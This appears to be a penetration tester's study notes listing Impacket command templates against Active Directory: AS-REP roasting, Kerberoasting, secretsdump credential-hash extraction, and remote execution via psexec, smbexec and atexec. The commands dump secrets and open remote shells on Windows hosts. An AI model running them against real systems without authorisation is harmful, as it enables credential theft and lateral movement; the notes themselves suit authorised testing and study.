>Impacket is one of the great AD enumeration toolset for Linux

### GetNPUser

``` zsh
impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP>
```

### PSExec

``` zsh
impacket-psexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP>
```

![[Pasted image 20240524104303.png]]


### GetUserSPNs

``` zsh
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request 
```


### SecretsDump

*It takes the hashes from the SAM file*

``` zsh
impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP>
```



### SMBExec

``` zsh
impacket-smbexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP>
```

![[Pasted image 20240524105427.png]]


### AtExec

``` zsh
impacket-atexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP> <COMMAND>
```

![[Pasted image 20240524110007.png]]
![[Pasted image 20240524110028.png]]


### DumpNTLMInfo

``` zsh
python DumpNTLMInfo.py <IP>
```

![[Pasted image 20240530095639.png]]